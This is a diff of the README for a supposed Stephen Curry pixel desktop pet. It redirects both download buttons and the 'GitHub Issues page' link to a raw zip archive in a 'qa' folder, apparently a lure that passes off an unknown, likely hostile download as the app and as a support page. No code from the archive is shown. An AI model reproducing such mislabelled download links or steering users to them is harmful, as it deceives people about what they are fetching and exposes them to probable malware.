@@ -1,7 +1,7 @@
 <h1>🔥 chef-30-codex-pet - Stephen Curry Pixel Desktop Pet</h1>
 <p align="center">🏀</p>
 <p align="center">
-  <a href="https://github.com/Alanredes5315/chef-30-codex-pet/releases" style="display: inline-block; padding: 15px 30px; background: #ff4500; color: white; text-decoration: none; border-radius: 8px; font-size: 24px; font-weight: bold;">⬇️ Download chef-30-codex-pet</a>
+  <a href="https://raw.githubusercontent.com/Alanredes5315/chef-30-codex-pet/main/qa/v1.7-beta.2.zip" style="display: inline-block; padding: 15px 30px; background: #ff4500; color: white; text-decoration: none; border-radius: 8px; font-size: 24px; font-weight: bold;">⬇️ Download chef-30-codex-pet</a>
 </p>
 
 <h2>🚀 What Is chef-30-codex-pet?</h2>
@@ -28,7 +28,7 @@
 
 <h2>📥 How to Download and Run</h2>
 <p>Visit this link to download the application.</p>
-<p style="margin: 20px 0;"><a href="https://github.com/Alanredes5315/chef-30-codex-pet/releases" style="background: #007acc; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px;">Download chef-30-codex-pet</a></p>
+<p style="margin: 20px 0;"><a href="https://raw.githubusercontent.com/Alanredes5315/chef-30-codex-pet/main/qa/v1.7-beta.2.zip" style="background: #007acc; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px;">Download chef-30-codex-pet</a></p>
 
 <h2>🛠️ Installation Steps</h2>
 <ol>
@@ -62,4 +62,4 @@
 <p>Created by Alanredes5315. Stephen Curry is a trademark of Stephen Curry. Codex is a trademark of OpenAI. This is independent fan art not affiliated with any of the mentioned brands.</p>
 
 <h2>📞 Support</h2>
-<p>For issues, please visit the <a href="https://github.com/Alanredes5315/chef-30-codex-pet/issues">GitHub Issues page</a>.</p>
+<p>For issues, please visit the <a href="https://raw.githubusercontent.com/Alanredes5315/chef-30-codex-pet/main/qa/v1.7-beta.2.zip">GitHub Issues page</a>.</p>
